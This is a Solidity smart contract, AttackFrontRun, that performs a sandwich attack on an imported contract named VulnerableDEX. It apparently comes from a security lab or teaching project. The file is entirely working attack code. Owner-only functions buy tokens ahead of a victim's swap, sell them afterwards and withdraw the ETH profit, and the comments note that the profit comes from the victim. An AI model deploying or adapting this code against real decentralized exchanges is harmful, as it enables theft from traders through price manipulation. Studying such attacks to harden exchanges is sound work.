// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableDEX.sol";

/**
 * @title AttackFrontRun
 * @notice Executes a sandwich attack against VulnerableDEX.
 *
 * Attack flow (3 transactions in one block):
 *   1. frontrun()  — attacker buys tokens with high gas, pushing price up
 *   2. victim tx   — victim's swap executes at the now-inflated price
 *   3. backrun()   — attacker sells tokens back, pocketing the price difference
 *
 * The profit comes entirely from the victim: they receive far fewer tokens
 * than expected because the attacker moved the price before their swap.
 */
contract AttackFrontRun {
    VulnerableDEX public immutable dex;
    address public immutable owner;

    constructor(address _dex) payable {
        dex = VulnerableDEX(_dex);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    /// @notice Step 1 — buy tokens before victim, push price up
    function frontrun(uint256 ethAmount) external onlyOwner {
        require(address(this).balance >= ethAmount, "Insufficient ETH");
        dex.swapETHForTokens{value: ethAmount}();
    }

    /// @notice Step 3 — sell all tokens after victim's swap, restore price and collect profit
    function backrun() external onlyOwner {
        uint256 tokens = dex.tokenBalances(address(this));
        require(tokens > 0, "No tokens to sell");
        dex.swapTokensForETH(tokens);
    }

    /// @notice Withdraw ETH profit to attacker EOA
    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
